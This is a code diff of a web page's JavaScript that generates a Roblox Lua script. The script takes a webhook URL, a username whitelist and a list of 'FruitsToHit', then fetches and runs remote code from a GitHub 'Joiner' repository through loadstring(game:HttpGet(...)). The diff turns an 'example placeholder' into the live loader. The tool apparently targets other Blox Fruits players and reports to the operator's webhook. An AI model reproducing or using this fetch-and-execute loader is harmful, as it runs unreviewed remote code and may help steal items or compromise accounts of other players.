@@ -116,10 +116,10 @@ document.addEventListener('DOMContentLoaded', () => {
         const fruitsLuaTable = selectedFruits.join(', ');
 
         const baseScript = `Webhook = "${webhookUrl}" -- Webhook URL
-Usernames = {${usernamesLuaTable}} -- Usernames
+Usernames = {${usernamesLuaTable}} -- Usernames to Whitelist
 FruitsToHit = {${fruitsLuaTable}} -- Fruits to detect
 
--- Load the main script (example placeholder)
+-- Load the main script
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
         return baseScript;
     }
